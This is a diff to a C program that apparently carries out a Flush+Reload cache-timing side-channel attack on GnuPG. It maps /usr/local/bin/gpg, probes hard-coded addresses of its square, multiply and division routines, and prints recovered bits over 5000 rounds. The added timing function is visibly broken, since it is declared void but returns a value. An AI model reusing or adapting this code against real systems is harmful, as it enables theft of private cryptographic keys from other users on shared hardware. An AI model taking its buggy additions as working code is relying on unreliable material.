@@ -29,9 +29,9 @@ int probe(char* addr){
         :"=a"(time)
         :"c"(addr)
         :"edi","edx"
-       
+
     );
-   
+
     return time < THRESHOLD;
 }
 void busy_wait(){
@@ -40,7 +40,23 @@ void busy_wait(){
         "nop\n\t"
         );
     }
-   
+
+}
+
+void time(){
+  volatile unsigned int time;
+
+   asm __volatile__(
+        "mfence\n\t"
+        "rdtsc\n\t"
+        "lfence\n\t"
+
+        :"=a"(time)
+        :
+        :
+    );
+
+   return time;
 }
 int main(void){
     int fp = open("/usr/local/bin/gpg", O_RDONLY);
@@ -56,12 +72,22 @@ int main(void){
    int sqr_addr= 0x9f44c;
    int mul_addr = 0x9fd80;
    int divrem_addr = 0x9e57c;
-   
+
+
+   unsigned int first = time();
+   int sqr = probe(file_addr + sqr_addr);
+   int mul = probe(file_addr + mul_addr);
+   int divrem = probe(file_addr + divrem_addr);
+   unsigned int second = time();
+
+   printf("first %u\n",first);
+   printf("second %u\n",second);
+
    for(int i=0;i< 5000;i++){
        int sqr = probe(file_addr + sqr_addr);
        int mul = probe(file_addr + mul_addr);
        int divrem = probe(file_addr + divrem_addr);
-       
+
        if(sqr && mul && divrem){
            printf("1");
        }else{
@@ -69,8 +95,8 @@ int main(void){
        }
        // busy wait
        busy_wait();
-   
-       
+
+
    }
     return 0;
 }
